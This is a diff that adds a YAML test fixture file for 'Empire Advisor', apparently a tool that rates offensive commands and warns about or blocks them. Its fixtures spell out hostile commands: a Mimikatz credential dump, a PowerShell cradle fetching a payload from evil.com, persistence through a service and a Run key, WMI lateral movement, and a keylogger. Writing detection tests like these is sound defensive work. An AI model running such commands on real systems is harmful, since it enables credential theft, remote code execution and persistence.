@@ -1,0 +1,84 @@
+# Test fixture commands for Empire Advisor
+# Each fixture includes expected behavior for acceptance testing
+
+fixtures:
+  - name: "Mimikatz credential dump"
+    command: "Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords'"
+    expected_rules:
+      - R002  # Direct Credential Dump
+    expected_score_max: 20  # Should be very low (noisy)
+    expected_action: "block"
+    has_suggestion: true
+
+  - name: "PowerShell download cradle"
+    command: "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"
+    expected_rules:
+      - R003  # PowerShell Download Cradle
+      - R004  # Cleartext HTTP Traffic
+    expected_score_max: 20  # Multiple high-severity matches
+    expected_action: "block"  # Correctly blocked due to cumulative risk
+    has_suggestion: true
+
+  - name: "Network scan"
+    command: "Invoke-Portscan -Hosts 10.0.0.0/24 -TopPorts 100"
+    expected_rules:
+      - R001  # Noisy Network Scan
+    expected_score_max: 30
+    expected_action: "warn"
+    has_suggestion: true
+
+  - name: "Service creation for persistence"
+    command: "sc create WindowsUpdate binPath= C:\\temp\\payload.exe start= auto"
+    expected_rules:
+      - R007  # Service Creation
+    expected_score_max: 40
+    expected_action: "warn"
+    has_suggestion: true
+
+  - name: "WMI lateral movement"
+    command: "wmic /node:target process call create 'cmd.exe /c payload.exe'"
+    expected_rules:
+      - R010  # WMI Process Creation
+    expected_score_max: 30
+    expected_action: "warn"
+    has_suggestion: true
+
+  - name: "Benign command"
+    command: "Get-Process | Where-Object {$_.CPU -gt 100}"
+    expected_rules: []
+    expected_score_min: 100  # Should be perfect
+    expected_action: "allow"
+    has_suggestion: false
+
+  - name: "Registry persistence"
+    command: "Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'Update' -Value 'C:\\payload.exe'"
+    expected_rules:
+      - R008  # Registry Run Key
+    expected_score_max: 40
+    expected_action: "warn"
+    has_suggestion: true
+
+  - name: "AD user enumeration"
+    command: "Get-ADUser -Filter * -Properties *"
+    expected_rules:
+      - R006  # Batch User Enumeration
+    expected_score_max: 50
+    expected_action: "warn"
+    has_suggestion: true
+
+  - name: "Multiple violations"
+    command: "Invoke-Mimikatz | Out-File mimikatz.txt; nmap -sS 10.0.0.0/24"
+    expected_rules:
+      - R002  # Direct Credential Dump
+      - R001  # Noisy Network Scan
+    expected_score_max: 20
+    expected_action: "block"
+    has_suggestion: true
+
+  - name: "Keylogger"
+    command: "Get-Keystrokes -LogPath C:\\temp\\keys.txt"
+    expected_rules:
+      - R012  # Keylogger Pattern
+    expected_score_max: 25
+    expected_action: "warn"
+    has_suggestion: true
